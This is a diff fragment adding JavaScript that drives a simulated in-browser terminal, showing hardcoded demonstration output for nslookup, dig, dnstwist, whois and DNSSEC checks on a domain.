+      case 'nslookup':typed='nslookup -type='+ty+' '+d;out='Server:  1.1.1.1\nAddress: 1.1.1.1#53\n\nNon-authoritative answer:\n'+rr(d,ty,ip).replace(/\t/g,' ');break;
+      case 'dig':typed='dig '+d+' '+ty;out='; &lt;&lt;&gt;&gt; DiG 9.18 &lt;&lt;&gt;&gt; '+d+' '+ty+'\n;; ANSWER SECTION:\n'+rr(d,ty,ip)+'\n\n'+G(';; Query time: 24 msec · SERVER: 1.1.1.1#53 · via syxx.app');break;
+      case 'dnstwist':{const t1=d.replace(/^(.)(.*)$/,'$1'+'$1'+'$2'),t2=d.replace('o','0').replace('i','1');typed='dnstwist '+d;out=' '+d+'      original     '+ip+'\n '+t1+'   omission     '+ip2+'  '+R('\u26a0 registered')+'\n '+t2+'   replacement  \u2014       available\n'+Y('3 of 41 permutations resolve — 2 look like potential lookalikes');break;}
+      case 'whois':typed='whois '+d;out='Domain Name: '+d.toUpperCase()+'\nRegistrar: MarkMonitor Inc.\nCreation Date: 2009-03-04\nRegistrant: '+D('REDACTED FOR PRIVACY')+'\n'+G('status: clientTransferProhibited · clientUpdateProhibited');break;
+      case 'dnssec':typed='dnssec-check '+d;out=d+' DNSKEY: present (alg 13, ECDSAP256SHA256)\nDS in parent zone: matches\n'+G('\u2713 chain of trust validated from the root');break;
+      default:typed=name;out=Y('command not permitted in this shell');
+    }
+    mrun(typed,out);
+  }
+</script>
+</body>
+</html>
